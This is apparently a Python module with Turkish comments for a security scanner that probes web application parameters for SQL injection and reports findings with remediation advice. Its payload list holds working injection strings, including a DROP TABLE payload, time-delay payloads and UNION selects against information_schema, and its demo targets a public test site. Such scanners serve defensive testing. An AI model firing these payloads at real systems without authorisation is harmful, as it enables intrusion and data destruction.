#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nexus-Scanner SQL Injection Detection Module
Profesyonel siber güvenlik aracı - SQL enjeksiyon tespiti

Bu modül web uygulamalarında SQL injection açıklarını tespit eder.
"""

import requests
import urllib.parse
import time
import re
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse

@dataclass
class SQLInjectionResult:
    """SQL injection test sonucu"""
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    error_message: str = ""
    response_time: float = 0.0
    confidence: str = "low"  # low, medium, high
    risk_level: str = "info"  # info, low, medium, high, critical

class SQLInjectionScanner:
    """SQL Injection güvenlik açığı tarayıcısı"""
    
    def __init__(self, timeout: int = 10, delay: float = 1.0):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Nexus-Scanner/1.0 (Security Testing Tool)'
        })
        
        # SQL injection test payloadları
        self.payloads = {
            'error_based': [
                "'",
                '"',
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1--",
                '" OR 1=1--',
                "'; DROP TABLE users--",
                "' UNION SELECT NULL--",
                "' AND 1=CONVERT(int, (SELECT @@version))--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name FROM information_schema.tables--"
            ]
        }
        
        # SQL hata mesajları (farklı veritabanları için)
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"ORA-[0-9]{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"SQLSTATE\[HY000\]",
            r"SQL command not properly ended",
            r"mysql_fetch_array\(\)",
            r"OLE DB.*error",
            r"Microsoft.*ODBC.*Driver"
        ]
    
    def scan_url(self, url: str, parameters: Dict[str, str] = None) -> List[SQLInjectionResult]:
        """Belirtilen URL'yi SQL injection açıkları için tarar"""
        results = []
        
        if not parameters:
            # URL'den parametreleri çıkar
            parsed_url = urlparse(url)
            if parsed_url.query:
                parameters = dict(urllib.parse.parse_qsl(parsed_url.query))
                url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            else:
                return results
        
        print(f"🔍 SQL Injection taraması başlatılıyor: {url}")
        
        # Her parametre için test yap
        for param_name, param_value in parameters.items():
            print(f"  📋 Parametre test ediliyor: {param_name}")
            
            # Farklı payload türleri için test
            for payload_type, payloads in self.payloads.items():
                for payload in payloads:
                    result = self._test_parameter(url, parameters, param_name, payload, payload_type)
                    if result:
                        results.append(result)
                        if result.vulnerable:
                            print(f"  ⚠️  SQL Injection tespit edildi: {param_name} - {payload_type}")
                    
                    # Rate limiting
                    time.sleep(self.delay)
        
        return results
    
    def _test_parameter(self, url: str, parameters: Dict[str, str], 
                       param_name: str, payload: str, payload_type: str) -> Optional[SQLInjectionResult]:
        """Tek bir parametre için SQL injection testi yapar"""
        
        # Test parametrelerini hazırla
        test_params = parameters.copy()
        test_params[param_name] = payload
        
        try:
            start_time = time.time()
            
            # GET isteği gönder
            response = self.session.get(url, params=test_params, timeout=self.timeout)
            
            response_time = time.time() - start_time
            
            # Sonucu analiz et
            is_vulnerable, confidence, risk_level, error_msg = self._analyze_response(
                response, payload_type, response_time
            )
            
            return SQLInjectionResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=is_vulnerable,
                error_message=error_msg,
                response_time=response_time,
                confidence=confidence,
                risk_level=risk_level
            )
            
        except requests.exceptions.RequestException as e:
            return SQLInjectionResult(
                url=url,
                parameter=param_name,
                payload=payload,
                vulnerable=False,
                error_message=f"Request error: {str(e)}",
                confidence="low",
                risk_level="info"
            )
    
    def _analyze_response(self, response: requests.Response, payload_type: str, 
                         response_time: float) -> tuple:
        """HTTP yanıtını analiz ederek SQL injection varlığını tespit eder"""
        
        is_vulnerable = False
        confidence = "low"
        risk_level = "info"
        error_message = ""
        
        # Error-based detection
        if payload_type == 'error_based':
            for pattern in self.error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    is_vulnerable = True
                    confidence = "high"
                    risk_level = "high"
                    error_message = f"SQL error pattern detected: {pattern}"
                    break
        
        # Time-based detection
        elif payload_type == 'time_based':
            if response_time > 4.0:  # 5 saniye delay bekliyoruz
                is_vulnerable = True
                confidence = "medium"
                risk_level = "medium"
                error_message = f"Time delay detected: {response_time:.2f}s"
        
        # Union-based detection
        elif payload_type == 'union_based':
            # UNION sorguları genellikle farklı sütun sayıları döndürür
            if "mysql" in response.text.lower() or "version()" in response.text.lower():
                is_vulnerable = True
                confidence = "high"
                risk_level = "critical"
                error_message = "UNION query executed successfully"
        
        # HTTP status code kontrolü
        if response.status_code == 500:
            if not is_vulnerable:  # Zaten tespit edilmediyse
                is_vulnerable = True
                confidence = "low"
                risk_level = "low"
                error_message = "HTTP 500 error - possible SQL injection"
        
        return is_vulnerable, confidence, risk_level, error_message
    
    def generate_report(self, results: List[SQLInjectionResult]) -> Dict[str, Any]:
        """Tarama sonuçlarından rapor oluşturur"""
        
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        total_tests = len(results)
        
        # Risk seviyelerine göre grupla
        risk_summary = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for result in results:
            if result.vulnerable:
                risk_summary[result.risk_level] += 1
        
        # Vulnerable parametreleri listele
        vulnerable_params = []
        for result in results:
            if result.vulnerable:
                vulnerable_params.append({
                    "url": result.url,
                    "parameter": result.parameter,
                    "payload": result.payload,
                    "risk_level": result.risk_level,
                    "confidence": result.confidence,
                    "error_message": result.error_message
                })
        
        return {
            "scan_summary": {
                "total_tests": total_tests,
                "vulnerable_count": vulnerable_count,
                "safe_count": total_tests - vulnerable_count,
                "vulnerability_rate": f"{(vulnerable_count/total_tests*100):.1f}%" if total_tests > 0 else "0%"
            },
            "risk_summary": risk_summary,
            "vulnerable_parameters": vulnerable_params,
            "recommendations": self._get_recommendations(vulnerable_count > 0)
        }
    
    def _get_recommendations(self, has_vulnerabilities: bool) -> List[str]:
        """Güvenlik önerileri döndürür"""
        
        if has_vulnerabilities:
            return [
                "🚨 ACIL: SQL injection açıkları tespit edildi!",
                "✅ Parametrized queries (prepared statements) kullanın",
                "✅ Input validation ve sanitization uygulayın",
                "✅ Veritabanı kullanıcı yetkilerini kısıtlayın",
                "✅ Web Application Firewall (WAF) kullanın",
                "✅ Hata mesajlarını kullanıcılara göstermeyin",
                "✅ Düzenli güvenlik testleri yapın"
            ]
        else:
            return [
                "✅ SQL injection açığı tespit edilmedi",
                "🔄 Düzenli güvenlik taramaları yapmaya devam edin",
                "📚 Güvenli kodlama pratiklerini sürdürün",
                "🛡️ Savunma katmanlarını güncel tutun"
            ]

# Test fonksiyonu
if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    
    # Test URL'i
    test_url = "http://testphp.vulnweb.com/artists.php"
    test_params = {"artist": "1"}
    
    print("Nexus-Scanner SQL Injection Test")
    print("=" * 40)
    
    results = scanner.scan_url(test_url, test_params)
    report = scanner.generate_report(results)
    
    print("\n📊 Tarama Raporu:")
    print(f"Toplam Test: {report['scan_summary']['total_tests']}")
    print(f"Güvenlik Açığı: {report['scan_summary']['vulnerable_count']}")
    print(f"Güvenli: {report['scan_summary']['safe_count']}")
    
    if report['vulnerable_parameters']:
        print("\n⚠️ Tespit Edilen Açıklar:")
        for vuln in report['vulnerable_parameters']:
            print(f"  - {vuln['parameter']}: {vuln['risk_level']} risk")
    
    print("\n💡 Öneriler:")
    for rec in report['recommendations']:
        print(f"  {rec}")